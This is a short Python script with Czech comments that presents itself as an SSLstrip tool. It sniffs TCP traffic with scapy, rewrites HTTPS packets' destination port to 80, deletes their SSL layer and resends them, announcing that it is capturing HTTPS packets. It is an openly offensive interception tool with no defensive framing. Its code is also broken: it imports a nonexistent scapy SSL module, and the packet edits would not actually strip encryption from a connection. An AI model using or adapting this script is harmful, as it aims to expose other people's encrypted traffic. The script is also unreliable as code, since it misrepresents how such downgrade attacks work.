import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.ssl import SSL
import socket
import threading

# Mapa pro přesměrování HTTPS na HTTP
def sslstrip(packet):
    if packet.haslayer(SSL):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        port_src = packet[TCP].sport
        port_dst = packet[TCP].dport
        
        if packet[TCP].dport == 443:  # HTTPS port
            # Přesměrování na HTTP
            packet[TCP].dport = 80  # HTTP port
            del packet[SSL]  # Odstranění SSL vrstvy
            scapy.send(packet)  # Odeslání upraveného paketu
            print(f"SSL Strip: {ip_src} -> {ip_dst} (HTTPS -> HTTP)")

# Vytvoření snifferu pro odchytávání paketů
def packet_sniffer():
    scapy.sniff(prn=sslstrip, filter="tcp", store=0)

# Spuštění snifferu na samostatném vlákně
sniffer_thread = threading.Thread(target=packet_sniffer)
sniffer_thread.start()

print("SSLstrip běží, začínám odchytávat HTTPS pakety...")

